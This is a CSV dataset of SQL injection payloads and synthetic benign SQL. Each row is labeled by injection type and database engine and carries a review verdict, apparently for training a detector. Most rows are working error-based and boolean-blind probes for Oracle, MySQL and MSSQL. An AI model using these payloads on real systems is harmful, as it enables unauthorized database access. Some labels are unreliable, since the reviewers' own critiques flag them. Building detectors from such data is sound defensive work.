payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
"SELECT * FROM users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" AND username = ""-9501\' )",error_based,oracle,0.9,Oracle xmltype case-based,"SELECT * FROM users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" AND username = ""-9501\' )",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' + ( select \'__IDENT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) ) + \' and __IDENT__ = ""-__INT__\' )",KEEP,
"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",error_based,oracle,0.9,Oracle cast for error extraction,"1\' ) ) as plbt where 4368 = 4368 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",True,1,"__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = ""__INT__\' + ( select \'__IDENT__\' where __INT__ = __INT__ and __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) ) + \'",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248""",error_based,mssql,0.8,char for MSSQL encoding,1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi,True,1,__INT__\' ) ) ) and __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) and ( ( ( \'__IDENT__\' = \'__IDENT__,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,error_based,oracle,0.95,xmltype for Oracle error extraction,"1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,"__INT__"" or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
yoel,benign,generic,0.9,not_sql_injection,yoel,False,0,__IDENT__,DROP,payload too short (4 chars)
molledo basagaa,benign,generic,0.9,not_sql_injection,molledo basagaa,False,0,__IDENT__ __IDENT__,RELABEL,reasoning too short (17 chars)
1.76476E+15,benign,generic,0.9,not_sql_injection,1.76476E+15,False,0,__INT__.76476e + __INT__,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,"-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",True,1,"-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) --",KEEP,
"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.7,count_concat,"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",False,0,"__INT__ and ( select __INT__ from ( select __IDENT__ ( * ) , concat ( __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , __IDENT__ ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from information_schema . __IDENT__ group by __IDENT__ ) __IDENT__ )",RELABEL,reasoning too short (12 chars)
"select * from users WHERE username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1157 ) ) as sxie where 7118 = 7118 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",out_of_band,oracle,0.9,Oracle ctxsys.drithsx,"-1157 ) ) as sxie where 7118 = 7118 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",True,1,"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) --",RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6)
SELECT they ( s FROM somewhere RIGHT JOIN,benign,generic,1.0,Incomplete SELECT with function,SELECT they ( s FROM somewhere RIGHT JOIN,False,0,select __IDENT__ ( __IDENT__ from __IDENT__ right join,KEEP,
njar,benign,generic,0.9,not_sql_injection,njar,False,0,__IDENT__,DROP,payload too short (4 chars)
"SELECT Employees.surrounded, COUNT ( Orders.exclaimedID ) AS rushFROM ( OrdersINNER JOIN accurate ON Orders.herselfID = Employees.sitID )",benign,generic,1.0,Normal SELECT with aggregate and subquery JOIN,"SELECT Employees.surrounded, COUNT ( Orders.exclaimedID ) AS rushFROM ( OrdersINNER JOIN accurate ON Orders.herselfID = Employees.sitID )",False,0,"select __IDENT__ , __IDENT__ ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",KEEP,
SELECT * FROM total WHERE during BETWEEN 'scared' AND 'faster',benign,generic,1.0,Normal SELECT with BETWEEN string,SELECT * FROM total WHERE during BETWEEN 'scared' AND 'faster',False,0,select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,KEEP,
SELECT four ( s ) FROM accurate UNION,benign,generic,1.0,Normal SELECT with function and UNION,SELECT four ( s ) FROM accurate UNION,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ union,RELABEL,benign payload contains 'union' (likely false negative)
"select * from users WHERE username = ""1%\' ) ) ) or username = ""1%\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'%\' = \'""",error_based,oracle,0.9,Oracle ctxsys.drithsx.sn function,"1%\' ) ) ) or username = ""1%\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'%\' = \'",True,1,"__INT__ % \' ) ) ) or __IDENT__ = ""__INT__ % \' ) ) and __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and ( ( \' % \' = \'",KEEP,
DELETE FROM roof WHERE part = 'lesson',benign,generic,1.0,Normal SQL DELETE WHERE,DELETE FROM roof WHERE part = 'lesson',False,0,delete from __IDENT__ where __IDENT__ = __STR__,KEEP,
"select * from users WHERE username = ""-2495 ) ) as hudw where 4197 = 4197 or username = ""1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """"",error_based,oracle,0.95,xmltype for Oracle error-based extraction,"-2495 ) ) as hudw where 4197 = 4197 or username = ""1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,True,1,"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = __STR__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and __STR__ = """,KEEP,
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct,benign,generic,1.0,Normal SQL mixed dialects,SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct,False,0,select * from __IDENT__ __IDENT__ __IDENT__ __INT__ __IDENT__ __IDENT__ select __IDENT__ __INT__ __IDENT__ * from __IDENT__,KEEP,
"select * from users WHERE username = ""-1641\' ) ) or username = ""-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.8,char for MSSQL encoding,"select * from users WHERE username = ""-1641\' ) ) or username = ""-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,select * from __IDENT__ where __IDENT__ = __STR__-__INT__ ) ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ),RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"SELECT * FROM club WHERE tell NOT IN ( 'has', 'merely', 'practice' )",benign,generic,1.0,Normal SELECT query with NOT IN clause,"SELECT * FROM club WHERE tell NOT IN ( 'has', 'merely', 'practice' )",False,0,"select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",KEEP,
SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,benign,generic,1.0,Malformed SELECT with multiple TOP and FETCH,SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,False,0,select __IDENT__ __INT__ * from __IDENT__ select * from __IDENT__ 3select * from __IDENT__,KEEP,
"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 6395 = 6395"" and username = ""-7199\'",error_based,oracle,0.95,Oracle ctxsys.drithsx.sn extraction,"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 6395 = 6395"" and username = ""-7199\'",False,0,"select * from __IDENT__ where __IDENT__ = __INT__ ) ) ) and __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and ( ( ( __INT__ = __INT__ and __IDENT__ = ""-__INT__\'",KEEP,
"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",boolean_blind,mysql,0.7,elt_boolean,"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",False,0,"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",RELABEL,reasoning too short (11 chars)
